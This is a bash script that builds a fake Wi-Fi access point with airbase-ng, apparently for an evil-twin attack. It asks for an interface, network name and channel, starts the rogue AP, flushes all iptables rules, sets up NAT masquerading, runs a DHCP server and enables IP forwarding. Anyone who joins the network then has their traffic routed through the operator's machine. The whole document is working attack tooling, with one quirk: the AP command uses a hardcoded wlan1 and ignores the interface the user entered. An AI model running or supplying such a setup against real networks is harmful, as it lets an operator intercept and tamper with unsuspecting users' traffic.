#!/bin/bash

echo "What interface will the fake ap be running on?"
read apinterface

echo "What is the ESSID for the network"
read essid

echo "What channel are we operating on?"
read channel

echo "Killing Airbase-ng and DHCPD if they are running"
pkill airbase-ng && pkill dhcpd3

echo "Putting Wlan In Monitor Mode..."
airmon-ng stop $apinterface && airmon-ng start $apinterface $channel

sleep 5

echo "Starting Fake AP"
airbase-ng -e $essid -c $channel -v wlan1 &

sleep 5

#ifconfig at0 up
ifconfig at0 10.0.0.254 netmask 255.255.255.0 # Change IP addresses as configured in your dhcpd.conf
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254

sleep 5

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

#echo &gt; '/var/lib/dhcp3/dhcpd.leases'
#ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &

sleep 5

sudo echo "1" > /proc/sys/net/ipv4/ip_forward

